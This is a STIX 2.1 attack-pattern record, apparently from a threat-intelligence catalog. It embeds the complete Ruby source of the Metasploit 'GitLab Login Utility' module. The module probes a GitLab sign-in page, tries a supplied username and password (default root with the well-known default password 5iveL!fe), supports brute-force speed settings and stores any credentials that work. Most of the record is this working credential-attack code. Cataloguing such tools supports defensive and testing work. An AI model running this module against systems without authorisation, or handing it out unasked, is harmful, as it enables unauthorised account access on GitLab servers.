{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f4e6e481-7b32-4c88-a666-3d76d830c6a3",
    "created": "2024-08-14T16:28:48.063189Z",
    "modified": "2024-08-14T16:28:48.063193Z",
    "name": "GitLab Login Utility",
    "description": "This module attempts to login to a GitLab instance using a specific user/pass.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/gitlab_login.rb",
            "external_id": "gitlab_login.rb"
        },
        {
            "source_name": "reference",
            "url": "https://labs.f-secure.com/archive/gitlab-user-enumeration/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/gitlab'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize\n    super(\n      'Name'        => 'GitLab Login Utility',\n      'Description' => 'This module attempts to login to a GitLab instance using a specific user/pass.',\n      'Author'      => [ 'Ben Campbell' ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['URL', 'https://labs.f-secure.com/archive/gitlab-user-enumeration/']\n        ]\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('HttpUsername', [ true, 'The username to test', 'root' ]),\n        OptString.new('HttpPassword', [ true, 'The password to test', '5iveL!fe' ]),\n        OptString.new('TARGETURI', [true, 'The path to GitLab', '/'])\n      ])\n\n    deregister_options('PASSWORD_SPRAY')\n\n    register_autofilter_ports([ 80, 443 ])\n  end\n\n  def run_host(ip)\n    uri = normalize_uri(target_uri.path.to_s, 'users', 'sign_in')\n    res = send_request_cgi(\n                            'method' => 'GET',\n                            'cookie' => 'request_method=GET',\n                            'uri'    => uri\n    )\n\n    if res && res.body && res.body.include?('user[email]')\n      vprint_status(\"GitLab v5 login page\")\n    elsif res && res.body && res.body.include?('user[login]')\n      vprint_status(\"GitLab v7 login page\")\n    else\n      vprint_error('Not a valid GitLab login page')\n      return\n    end\n\n    cred_collection = build_credential_collection(\n      username: datastore['HttpUsername'],\n      password: datastore['HttpPassword']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::GitLab.new(\n      configure_http_login_scanner(\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        uri: uri,\n        connection_timeout: 10\n      )\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: fullname,\n          workspace_id: myworkspace_id\n      )\n      if result.success?\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential}\"\n      else\n        invalidate_login(credential_data)\n        vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})\"\n      end\n    end\n  end\nend\n"
}